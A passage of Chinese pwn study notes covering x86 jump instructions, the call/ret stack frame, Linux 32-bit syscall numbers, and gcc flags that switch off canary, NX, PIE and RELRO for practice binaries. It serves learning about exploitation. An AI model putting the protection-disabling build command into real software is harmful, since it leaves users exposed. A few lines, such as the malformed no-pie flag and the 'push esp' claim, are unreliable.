;不溢出则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JA   ;无符号大于则跳转</span><br><span class=\"line\">JNA  ;无符号不大于则跳转</span><br><span class=\"line\">JAE  ;无符号大于等于则跳转</span><br><span class=\"line\">JNAE ;无符号不大于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JG   ;有符号大于则跳转</span><br><span class=\"line\">JNG  ;有符号不大于则跳转</span><br><span class=\"line\">JGE  ;有符号大于等于则跳转</span><br><span class=\"line\">JNGE ;有符号不大于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JB   ;无符号小于则跳转</span><br><span class=\"line\">JNB  ;无符号不小于则跳转</span><br><span class=\"line\">JBE  ;无符号小于等于则跳转</span><br><span class=\"line\">JNBE ;无符号不小于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">ps:</span><br><span class=\"line\">；rax = 2</span><br><span class=\"line\">cmp rax,1; =&gt;jump</span><br><span class=\"line\"></span><br><span class=\"line\">JL   ;有符号小于则跳转</span><br><span class=\"line\">JNL  ;有符号不小于则跳转</span><br><span class=\"line\">JLE  ;有符号小于等于则跳转</span><br><span class=\"line\">JNLE ;有符号不小于等于则跳转</span><br><span class=\"line\"></span><br><span class=\"line\">JP   ;奇偶位置位则跳转</span><br><span class=\"line\">JNP  ;奇偶位清除则跳转</span><br><span class=\"line\">JPE  ;奇偶位相等则跳转</span><br><span class=\"line\">JPO  ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure>\n<h4><span id=\"函数调用栈\">函数调用栈</span></h4><p>Leave等价于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov esp ebp</span><br><span class=\"line\">pop ebp</span><br></pre></td></tr></table></figure>\n<p> retn=pop eip（ret是回到函数调用前的下一条指令，ret指令等于将esp的贮存值（也就是栈·顶弹出）赋给eip，然后esp+4，由于esp中贮存的是函数调用前的下一条指令的地址，所以自然而然能够返回）</p>\n<p>但是为什么esp里面会贮存函数调用前的下一条指令的地址呢？</p>\n<p>这里要注意调用者函数和被调用者函数的栈桢是不同的。每一个发生一个函数调用就会产生一个新的栈帧。</p>\n<blockquote>\n<p>call指令调用一个过程，指挥处理器从新的内存地址开始执行。过程使用RET（从过程返回）指令将处理器转回到该过程被调用的程序点上。从物理上来说，CALL指令将其返回地址压入堆栈，再把被调用过程的地址复制到指令指针寄存器。当过程准备返回时，它的RET指令从堆栈把返回地址弹回到指令指针寄存器。</p>\n<p>​                                                                                                                         《cs：app》page：114</p>\n</blockquote>\n<p>（ps：csapp中的堆栈单纯指栈而不指堆）</p>\n<p>在这里当函数被调用，函数调用前的下一条指令的地址被作为esp的值被压栈了。也就是函数调用的第一句：push esp</p>\n<p>。函数被调——》</p>\n<p>被调用函数栈帧压入调用栈。</p>\n<p>建立新的栈帧，把被调函数的栈帧栈底地址放入bp中</p>\n<p>=〉push rbp</p>\n<p>​       mov rbp， rsp</p>\n<h3><span id=\"3编译指令\">3）编译指令</span></h3><h5><span id=\"1gcc编译\">1）gcc编译</span></h5><p>普通的编译（默认保护全开）】<code>gcc test.c -o test</code></p>\n<p>禁用PIE <code>gcc -z -no-pie test.c -o test</code></p>\n<p>禁用RELRO <code>gcc -z norelro x x x.c -o xxx</code></p>\n<p>禁用Canary <code>-fno-stack-protector</code></p>\n<p>禁用NX <code>gcc -z execstack -o test test.c</code></p>\n<p>所以保护全关的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o <span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<h3><span id=\"4linux系统调用号\">4）linux系统调用号</span></h3><h5><span id=\"132bit\">1）32bit</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_restart_syscall 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fork 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_read 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_write 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_close 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitpid 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_creat 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_link 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlink 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execve 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chdir 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_time 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknod 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chmod 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lchown 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_break 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldstat 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lseek 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpid 20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mount 21</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount 22</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid 23</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid 24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stime 25</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ptrace 26</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_alarm 27</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldfstat 28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pause 29</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utime 30</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stty 31</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gtty 32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_access 33</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nice 34</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftime 35</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync 36</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kill 37</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rename 38</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdir 39</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rmdir 40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup 41</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe 42</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_times 43</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prof 44</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_brk 45</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid 46</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid 47</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signal 48</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid 49</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid 50</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_acct 51</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umount2 52</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lock 53</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioctl 54</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl 55</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mpx 56</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpgid 57</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ulimit 58</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldolduname 59</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umask 60</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chroot 61</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ustat 62</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup2 63</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getppid 64</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgrp 65</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsid 66</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaction 67</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sgetmask 68</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ssetmask 69</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid 70</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid 71</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigsuspend 72</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigpending 73</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sethostname 74</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setrlimit 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrlimit 76</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrusage 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettimeofday 78</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_settimeofday 79</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups 81</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_select 82</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlink 83</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_oldlstat 84</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlink 85</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uselib 86</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapon 87</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_reboot 88</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readdir 89</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap 90</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munmap 91</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate 92</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate 93</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmod 94</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown 95</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpriority 96</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpriority 97</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_profil 98</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs 99</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioperm 101</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketcall 102</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syslog 103</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setitimer 104</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getitimer 105</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat 106</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat 107</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat 108</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_olduname 109</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_iopl 110</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vhangup 111</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_idle 112</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vm86old 113</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_wait4 114</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_swapoff 115</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysinfo 116</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ipc 117</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsync 118</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigreturn 119</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clone 120</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setdomainname 121</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uname 122</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_modify_ldt 123</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_adjtimex 124</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mprotect 125</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigprocmask 126</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_create_module 127</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_init_module 128</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_delete_module 129</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_kernel_syms 130</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_quotactl 131</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgid 132</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchdir 133</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bdflush 134</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysfs 135</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_personality 136</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_afs_syscall 137</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid 138</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid 139</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__llseek 140</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents 141</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__newselect 142</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flock 143</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msync 144</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readv 145</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_writev 146</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsid 147</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fdatasync 148</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR__sysctl 149</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock 150</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlock 151</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlockall 152</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munlockall 153</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setparam 154</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getparam 155</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setscheduler 156</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getscheduler 157</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_yield 158</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_max 159</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_get_priority_min 160</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nanosleep 162</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mremap 163</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid 164</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid 165</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vm86 166</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_query_module 167</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_poll 168</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nfsservctl 169</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid 170</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid 171</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prctl 172</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigreturn 173</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigaction 174</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigprocmask 175</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigpending 176</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigsuspend 179</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pread64 180</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwrite64 181</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown 182</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcwd 183</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capget 184</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capset 185</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaltstack 186</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile 187</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpmsg 188</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_putpmsg 189</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vfork 190</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ugetrlimit 191</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap2 192</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate64 193</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate64 194</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat64 195</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat64 196</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat64 197</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lchown32 198</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid32 199</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid32 200</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid32 201</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid32 202</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid32 203</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid32 204</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups32 205</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups32 206</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown32 207</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid32 208</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid32 209</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid32 210</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid32 211</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown32 212</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid32 213</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid32 214</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid32 215</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid32 216</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pivot_root 217</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mincore 218</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_madvise 219</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents64 220</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl64 221</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettid 224</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readahead 225</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setxattr 226</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lsetxattr 227</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsetxattr 228</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getxattr 229</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lgetxattr 230</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fgetxattr 231</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listxattr 232</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_llistxattr 233</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flistxattr 234</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_removexattr 235</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lremovexattr 236</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fremovexattr 237</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tkill 238</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile64 239</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futex 240</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setaffinity 